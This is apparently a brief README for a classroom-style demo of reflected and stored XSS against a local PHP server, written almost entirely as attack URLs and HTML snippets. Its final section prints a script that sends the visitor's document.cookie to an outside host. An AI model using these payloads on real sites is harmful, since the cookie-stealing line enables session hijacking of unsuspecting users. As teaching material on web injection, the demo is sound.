# Reflections

Demos for reflection-based XSS in PHP-based servers

Normal:
http://localhost:8100/?web=world!

Maybe:
http://localhost:8100/?web=%3Cb%3Eworld!%3C/b%3E

Even better:
http://localhost:8100/?web=%3Cp%3E%3Cimg%20width=%22500%22%20src=%22https://media1.tenor.com/images/09d57d510daf46cd78c5e4b712373849/tenor.gif?itemid=16270886%22%3E%3C/img%3E%3C/p%3E

Malicious:
http://localhost:8100/?web=world%3Cscript%3Ealert(1)%3C/script%3E

# Stored/Cross

<img width="500" src="https://media1.tenor.com/images/09d57d510daf46cd78c5e4b712373849/tenor.gif?itemid=16270886"></img>

# Self


```html
<script>fetch(`https://ocs.kekvrose.me/${document.cookie}`)</script>
```
